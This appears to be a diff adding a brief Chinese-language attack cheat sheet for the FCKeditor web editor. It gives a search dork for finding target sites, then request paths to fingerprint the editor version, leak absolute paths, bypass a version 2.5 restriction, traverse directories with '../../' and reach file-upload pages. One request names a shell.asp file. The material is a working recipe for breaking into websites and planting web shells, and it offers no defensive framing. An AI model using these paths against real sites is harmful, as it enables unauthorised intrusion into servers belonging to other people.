@@ -1,0 +1,17 @@
+关键字：inurl:products_category.asp?id= 
+在网址后加入/admin/FCKeditor/editor/filemanager/connectors/test.html#
+
+1、查看编辑器版本
+ /fckeditor/editor/dialog/fck_about.html
+ 
+2、爆绝对路径
+ FCKeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php(支持php的通杀)
+ /FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx 2.5可突破
+ 
+FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp
+ 3、遍历目录
+ /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=../../
+ 
+4、上传页面 
+
+editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector
